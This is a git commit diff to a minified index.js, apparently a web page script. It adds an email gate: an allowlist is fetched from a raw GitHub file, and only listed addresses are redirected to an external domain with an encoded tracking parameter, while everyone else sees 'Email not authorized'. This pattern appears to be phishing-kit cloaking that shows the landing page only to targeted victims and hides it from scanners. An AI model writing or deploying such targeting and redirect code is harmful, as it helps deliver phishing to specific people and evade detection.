016d2b7e26c1c783bdb9a9ed19835f54dec42c91
gitmenew <gitnew22@gmx.us>
2025-06-07 04:19:44 +0300

    Update index.js

--- index.js
+++ index.js
@@ -3998,29 +3998,23 @@ const Cl = {
             if (!this.isValidEmail(this.emailInput)) {
                 this.errorMessage = "Please enter a valid email address";
                 return
-            }
-            this.errorMessage = "",
-            this.isLoading = !0;
-            try {
-                const e = await fetch("https://raw.githubusercontent.com/gitmenew/ttttttttttt/main/response.json", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({
-                        email: this.emailInput
-                    })
-                })
-                  , t = await e.json();
-                if (!e.ok)
-                    throw new Error(t.message || "Verification failed");
-                t.redirectUrl && (window.location = t.redirectUrl)
-            } catch (e) {
-                this.errorMessage = e.message || "Unable to verify email"
-            } finally {
-                this.isLoading = !1
-            }
-        }
+           this.errorMessage = "";
+this.isLoading = true;
+try {
+    const e = await fetch("https://raw.githubusercontent.com/gitmenew/ttttttttttt/main/response.json");
+    const t = await e.json();
+
+    if (t.allowedEmails.includes(this.emailInput)) {
+        window.location = "https://agendeonline.com/i/?c3Y9Z2VuZXJhbCZyPXpzJnVpZD1VU0VSMDUwNjIwMjVVMjAwNjA1MTMmcz03WA==N0123N";
+    } else {
+        throw new Error("Email not authorized");
+    }
+} catch (e) {
+    this.errorMessage = e.message || "Unable to verify email";
+} finally {
+    this.isLoading = false;
+}
+
     }
 }
   , Tl = {
